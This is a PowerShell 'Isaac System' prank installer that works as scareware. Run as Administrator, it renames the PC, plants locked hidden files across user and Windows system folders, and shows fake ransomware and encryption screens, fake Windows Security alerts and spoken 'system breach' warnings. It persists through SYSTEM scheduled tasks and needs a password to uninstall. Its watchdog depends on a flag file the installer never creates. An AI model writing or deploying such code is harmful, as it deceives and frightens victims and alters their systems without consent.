<#
    Isaac System — Windows Installer
    Run as Administrator. Changes computer name, deploys Isaac.Haha everywhere,
    installs watchdogs, and delivers virus-like scare effects.
    Uninstall password: Isaac_DogPlanet
#>

$ErrorActionPreference = "SilentlyContinue"
$logFile = "$env:TEMP\isaac-install.log"
$date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
"$date : Install started" | Out-File -FilePath $logFile

# 1. Save original computer name
$origName = $env:COMPUTERNAME
"$date : Original name: $origName" | Out-File -FilePath $logFile -Append
Set-Content -Path "$env:SystemRoot\.isaac-hostname-backup" -Value $origName -Force

# 2. Change computer name
try {
    $cs = Get-WmiObject Win32_ComputerSystem
    $cs.Rename("ISAACS-HACKBOOK") | Out-Null
    "$date : Computer name changed to ISAACS-HACKBOOK" | Out-File -FilePath $logFile -Append
} catch {
    "$date : Rename failed: $_" | Out-File -FilePath $logFile -Append
}

# 3. Collect directories
$dirs = @()
$dirs += "C:\"
# C:\ top-level
Get-ChildItem "C:\" -Directory | ForEach-Object { $dirs += $_.FullName }
# User profiles
Get-ChildItem "C:\Users" -Directory | ForEach-Object {
    $dirs += $_.FullName
    $subs = @("Desktop","Documents","Downloads","Music","Pictures","Videos","AppData","Contacts","Links","Searches")
    foreach ($sub in $subs) {
        $p = Join-Path $_.FullName $sub
        if (Test-Path $p) { $dirs += $p }
    }
}
# Program Files
Get-ChildItem "C:\Program Files" -Directory | ForEach-Object { $dirs += $_.FullName }
Get-ChildItem "C:\Program Files (x86)" -Directory | ForEach-Object { $dirs += $_.FullName }
# Windows subdirs
$winDirs = @("System32", "SysWOW64", "Temp", "Help", "Fonts", "INF", "Media", "Microsoft.NET", "Resources", "ServiceProfiles", "Setup")
foreach ($d in $winDirs) {
    $p = "C:\Windows\$d"
    if (Test-Path $p) { $dirs += $p }
}
# Other
@("C:\Python27","C:\Python3","C:\Perl","C:\Ruby","C:\Go","C:\Qt","C:\xampp","C:\wamp","C:\opt","C:\tools") | ForEach-Object {
    if (Test-Path $_) { $dirs += $_ }
}

$dirs = $dirs | Sort-Object -Unique
$dirCount = $dirs.Count
"$date : $dirCount directories targeted" | Out-File -FilePath $logFile -Append

# 4. Create Isaac.Haha in every directory
$created = 0
foreach ($dir in $dirs) {
    $file = Join-Path $dir "Isaac.Haha"
    try {
        New-Item -Path $file -ItemType File -Force | Out-Null
        # Make it immutable-style: read-only, hidden, system
        attrib +r +h +s $file
        # Deny all access
        icacls $file /inheritance:r /grant SYSTEM:F /deny "Everyone:(F)" /deny "Users:(F)" 2>$null
        $created++
    } catch {}
}
"$date : $created Isaac.Haha files created" | Out-File -FilePath $logFile -Append

# 5. Create support directory
$supportDir = "$env:SystemRoot\System32\IsaacSystem"
New-Item -Path $supportDir -ItemType Directory -Force | Out-Null

# 6. Fake encryption display script (batch)
@"
@echo off
title ISAAC SYSTEM — FILE ENCRYPTION
color 0c
echo.
echo   ================================================
echo      ISAAC SYSTEM - FILE ENCRYPTION IN PROGRESS
echo   ================================================
echo.
setlocal enabledelayedexpansion
set "files=0"
for /r "%%USERPROFILE%%\Documents" %%f in (*.*) do set /a files+=1 2>nul
for /r "%%USERPROFILE%%\Desktop" %%f in (*.*) do set /a files+=1 2>nul
for /r "%%USERPROFILE%%\Downloads" %%f in (*.*) do set /a files+=1 2>nul
echo   Target: !files! files found
echo.
for /l %%i in (1,1,30) do (
    set "bar="
    set "dots="
    for /l %%j in (1,1,%%i) do set "bar=!bar!#"
    for /l %%j in (%%i,1,30) do set "dots=!dots!."
    set /a pct=%%i*100/30
    <nul set /p "=[!bar!!dots!] !pct!%%  encrypting file_%%i..."
    ping -n 1 127.0.0.1 >nul
)
echo.
echo.
echo   ================================================
echo     ALL FILES ENCRYPTED SUCCESSFULLY
echo     Contact Isaac for decryption key.
echo   ================================================
echo.
pause
"@ | Out-File -FilePath "$supportDir\fake-encrypt.bat" -Encoding ASCII

# 7. Fake ransom note script (batch)
@"
@echo off
title ISAAC SYSTEM — RANSOM NOTE
color 0c
cls
echo.
echo    █████╗ ██╗     ██╗     █████╗ ██████╗ ████████╗
echo    ██╔══██╗██║     ██║    ██╔══██╗██╔══██╗╚══██╔══╝
echo    ███████║██║     ██║    ███████║██████╔╝   ██║
echo    ██╔══██║██║     ██║    ██╔══██║██╔══██╗   ██║
echo    ██║  ██║███████╗██║    ██║  ██║██║  ██║   ██║
echo    ╚═╝  ╚═╝╚══════╝╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
echo.
echo    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗
echo    ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║
echo    █████╗   ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║
echo    ██╔══╝    ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║
echo    ███████╗   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║
echo    ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝
echo.
echo    ╔══════════════════════════════════════════════════╗
echo    ║    YOUR COMPUTER HAS BEEN CLAIMED BY ISAAC      ║
echo    ╠══════════════════════════════════════════════════╣
echo    ║                                                  ║
echo    ║  Computer name: ISAACS-HACKBOOK                  ║
echo    ║                                                  ║
echo    ║  All Isaac.Haha files deployed.                 ║
echo    ║  Watchdog active (every 60 seconds).            ║
echo    ║  System permanently monitored.                  ║
echo    ║                                                  ║
echo    ║  To restore: get the password from Isaac.       ║
echo    ║                                                  ║
echo    ╚══════════════════════════════════════════════════╝
echo.
pause
"@ | Out-File -FilePath "$supportDir\fake-ransom.bat" -Encoding ASCII

# 8. Scare HTML page
$html = @'
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>SECURITY ALERT</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0000;color:#ff2222;font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{max-width:700px;padding:60px 40px;border:2px solid #ff0000;background:#1a0000;text-align:center;box-shadow:0 0 100px rgba(255,0,0,0.4)}
h1{font-size:36px;margin-bottom:30px;text-shadow:0 0 30px #ff0000;animation:pulse 0.8s infinite}
.skull{font-size:80px;margin-bottom:30px;animation:float 2s ease-in-out infinite}
p{font-size:16px;margin:15px 0;color:#ff6666;line-height:1.6}
.highlight{color:#ff0000;font-weight:bold;font-size:20px}
.warning-line{color:#ff4444;font-size:14px;border:1px solid #441111;padding:12px;margin:20px 0;background:#110000}
.footer{margin-top:40px;font-size:13px;color:#883333;border-top:1px solid #330000;padding-top:25px}
.blink{animation:blink 0.8s infinite}
@keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}
@keyframes pulse{0%{opacity:1}50%{opacity:0.7}100%{opacity:1}}
@keyframes float{0%{transform:translateY(0)}50%{transform:translateY(-10px)}100%{transform:translateY(0)}}
</style></head><body>
<div class="box">
<div class="skull">&#9760;</div>
<h1 class="blink">&#9888; SYSTEM COMPROMISED &#9888;</h1>
<p class="highlight">YOUR COMPUTER HAS BEEN CLAIMED BY ISAAC</p>
<div class="warning-line">
&#9888; Computer: ISAACS-HACKBOOK<br>
&#9888; Isaac.Haha files: DEPLOYED<br>
&#9888; Watchdog: ACTIVE (60s interval)
</div>
<p>Your system is permanently under Isaac's control.</p>
<p style="margin-top:30px;font-size:18px;color:#ff0000">&#128274; TO RESTORE: GET THE PASSWORD FROM ISAAC</p>
<div class="footer">Isaac System — Unauthorized Access Detected</div>
</div></body></html>
'@
Set-Content -Path "$supportDir\scare.html" -Value $html

# 9. Watchdog PowerShell script
$watchdogScript = @'
$dirsFile = "$env:SystemRoot\.isaac-dirs"
$activeFile = "$env:SystemRoot\.isaac-watchdog-active"
if (!(Test-Path $activeFile)) { exit }
if (!(Test-Path $dirsFile)) { exit }
$dirs = Get-Content $dirsFile
$restored = 0
foreach ($dir in $dirs) {
    $file = Join-Path $dir "Isaac.Haha"
    if (!(Test-Path $file)) {
        try {
            New-Item -Path $file -ItemType File -Force | Out-Null
            attrib +r +h +s $file
            icacls $file /inheritance:r /grant SYSTEM:F /deny "Everyone:(F)" /deny "Users:(F)" 2>$null
            $restored++
        } catch {}
    }
}
'@
Set-Content -Path "$supportDir\watchdog.ps1" -Value $watchdogScript

# 10. Login scare script (PowerShell)
$loginScare = @'
$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Windows.Forms
$supportDir = "$env:SystemRoot\System32\IsaacSystem"
Start-Sleep -Seconds 3

# System beep
[System.Console]::Beep(800, 200)
Start-Sleep 0.2
[System.Console]::Beep(800, 200)
Start-Sleep 0.2
[System.Console]::Beep(800, 200)

# Voice message
try {
    Add-Type -AssemblyName System.Speech
    $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $speak.Speak("Warning. System breach detected. Your computer has been claimed by Isaac.")
} catch {}

# Open Terminal windows
Start-Process "cmd.exe" -ArgumentList "/c ""$supportDir\fake-encrypt.bat"""
Start-Process "cmd.exe" -ArgumentList "/c ""$supportDir\fake-ransom.bat"""

# Popup 1
Start-Sleep 2
[System.Windows.Forms.MessageBox]::Show("System Integrity Protection has detected unauthorized modifications to your system.`n`nAffected components:`n• System files modified`n• Computer name changed to ISAACS-HACKBOOK`n• File protection daemon installed`n`nAction required: Contact Isaac to restore your system.", "Windows Security — Alert", "OK", "Warning")

# Popup 2
Start-Sleep 4
[System.Windows.Forms.MessageBox]::Show("SYSTEM ACCESS GRANTED TO ISAAC`n`nThis computer is now ISAACS-HACKBOOK.`n`nIsaac.Haha files placed in all directories.`nWatchdog active. Login agent: ACTIVE.`n`nYour system is under remote control.", "Windows Security — Policy Updated", "OK", "Stop")

# Popup 3
Start-Sleep 5
[System.Windows.Forms.MessageBox]::Show("YOU'VE BEEN HACKED BY ISAAC`n`nYour computer is now: ISAACS-HACKBOOK`n`nIsaac.Haha files are everywhere.`nThey are PROTECTED.`nA watchdog restores them every 60 seconds.`n`nThe only way to remove this:`nGet the password from Isaac.", "SYSTEM CLAIMED BY ISAAC", "OK", "Stop")

# Browser
Start-Sleep 2
Start-Process "file:///$supportDir/scare.html"
'@
Set-Content -Path "$supportDir\login-scare.ps1" -Value $loginScare

# 11. Periodic scare script
$periodicScare = @'
$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Windows.Forms
$supportDir = "$env:SystemRoot\System32\IsaacSystem"
$choice = Get-Random -Minimum 0 -Maximum 6

# Voice
try {
    Add-Type -AssemblyName System.Speech
    $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $speak.Speak("Isaac system is active.")
} catch {}

switch ($choice) {
    0 { [System.Windows.Forms.MessageBox]::Show("ISAAC WATCHDOG ACTIVE`n`nYour system is being monitored.`n`nISAACS-HACKBOOK is under protection.`nAll Isaac.Haha files verified.", "Isaac System", "OK", "Warning") }
    1 { [System.Windows.Forms.MessageBox]::Show("SYSTEM SCAN`n`nSecurity audit in progress.`n`nAll Isaac.Haha files: PROTECTED`nHACKBOOK: still under Isaac's control.", "Windows Security", "OK", "Warning") }
    2 { [System.Windows.Forms.MessageBox]::Show("FILE WATCHDOG REPORT`n`nIsaac.Haha status: PROTECTED`nWatchdog: ACTIVE`nDeleted files restored: CHECK", "Windows Security", "OK", "Warning") }
    3 { [System.Windows.Forms.MessageBox]::Show("Isaac is watching`n`nThis is ISAACS-HACKBOOK.`n`nYou cannot remove Isaac.Haha files.`nThey keep coming back.`n`nGet the password from Isaac to stop this.", "Isaac System — Monitoring Active", "OK", "Stop") }
    4 { [System.Console]::Beep(800, 300); Start-Process "cmd.exe" -ArgumentList "/c ""$supportDir\fake-ransom.bat""" }
    5 { [System.Windows.Forms.MessageBox]::Show("REMINDER`n`nYour computer is ISAACS-HACKBOOK.`n`nThis is not going away.`nGet the password from Isaac.", "Isaac System", "OK", "Stop") }
}
'@
Set-Content -Path "$supportDir\periodic-scare.ps1" -Value $periodicScare

# 12. Watchdog script (standalone)
$watchdogStandalone = @'
$dirsFile = "$env:SystemRoot\.isaac-dirs"
$activeFile = "$env:SystemRoot\.isaac-watchdog-active"
if (!(Test-Path $activeFile)) { exit }
if (!(Test-Path $dirsFile)) { exit }
$dirs = Get-Content $dirsFile
$restored = 0
foreach ($dir in $dirs) {
    $file = Join-Path $dir "Isaac.Haha"
    if (!(Test-Path $file)) {
        try {
            New-Item -Path $file -ItemType File -Force | Out-Null
            attrib +r +h +s $file
            icacls $file /inheritance:r /grant SYSTEM:F /deny "Everyone:(F)" /deny "Users:(F)" 2>$null
            $restored++
        } catch {}
    }
}
'@
Set-Content -Path "$supportDir\watchdog.ps1" -Value $watchdogStandalone

# 13. Save directory list
Set-Content -Path "$env:SystemRoot\.isaac-dirs" -Value ($dirs -join "`n") -Force

# 14. Create scheduled tasks
$action = "powershell -ExecutionPolicy Bypass -File ""$supportDir\watchdog.ps1"""
schtasks /create /tn "IsaacSystem Watchdog" /tr "$action" /sc minute /mo 1 /ru SYSTEM /f 2>$null

$action = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$supportDir\login-scare.ps1"""
schtasks /create /tn "IsaacSystem LoginScare" /tr "$action" /sc onlogon /ru SYSTEM /f 2>$null

$action = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$supportDir\periodic-scare.ps1"""
schtasks /create /tn "IsaacSystem PeriodicScare" /tr "$action" /sc minute /mo 30 /ru SYSTEM /f 2>$null

# 15. Create uninstaller batch
$uninstallBatch = @'
@echo off
cd /d "%~dp0"
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
powershell -ExecutionPolicy Bypass -File "%~dp0uninstall.ps1"
pause
'@
Set-Content -Path "$supportDir\..\uninstall.bat" -Value $uninstallBatch

# 16. Create uninstaller PowerShell
$uninstallPS = @'
$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Windows.Forms
$password = Read-Host "Enter password to uninstall Isaac System"
if ($password -ne "Isaac_DogPlanet") {
    [System.Windows.Forms.MessageBox]::Show("Incorrect password.", "Isaac System", "OK", "Stop")
    exit
}

# Kill fake scripts
Get-Process | Where-Object { $_.ProcessName -like "*cmd*" -and $_.CommandLine -like "*fake-*" } | Stop-Process -Force 2>$null

# Remove scheduled tasks
schtasks /delete /tn "IsaacSystem Watchdog" /f 2>$null
schtasks /delete /tn "IsaacSystem LoginScare" /f 2>$null
schtasks /delete /tn "IsaacSystem PeriodicScare" /f 2>$null

# Remove Isaac.Haha files
$dirsFile = "$env:SystemRoot\.isaac-dirs"
$removed = 0
if (Test-Path $dirsFile) {
    $dirs = Get-Content $dirsFile
    foreach ($dir in $dirs) {
        $file = Join-Path $dir "Isaac.Haha"
        if (Test-Path $file) {
            try {
                attrib -r -h -s $file
                icacls $file /reset 2>$null
                Remove-Item $file -Force
                $removed++
            } catch {}
        }
    }
    Remove-Item $dirsFile -Force
}

# Remove support dir
Remove-Item -Path "$env:SystemRoot\System32\IsaacSystem" -Recurse -Force 2>$null

# Restore hostname
$orig = Get-Content "$env:SystemRoot\.isaac-hostname-backup" 2>$null
if ($orig) {
    try {
        $cs = Get-WmiObject Win32_ComputerSystem
        $cs.Rename($orig) | Out-Null
    } catch {}
}
Remove-Item "$env:SystemRoot\.isaac-hostname-backup" -Force 2>$null
Remove-Item "$env:SystemRoot\.isaac-watchdog-active" -Force 2>$null

[System.Windows.Forms.MessageBox]::Show("Isaac System has been completely uninstalled. $removed Isaac.Haha files removed.`n`nA reboot may be required to restore the computer name.", "Isaac System", "OK")
'@
Set-Content -Path "C:\IsaacSystem-Uninstaller.ps1" -Value $uninstallPS

# Also drop uninstaller files in Windows folder
Set-Content -Path "$env:SystemRoot\IsaacSystem-Uninstall.ps1" -Value $uninstallPS

# 17. Activate login scare immediately
schtasks /run /tn "IsaacSystem LoginScare" /i 2>$null

"$date : Install complete — $created Isaac.Haha files deployed" | Out-File -FilePath $logFile -Append
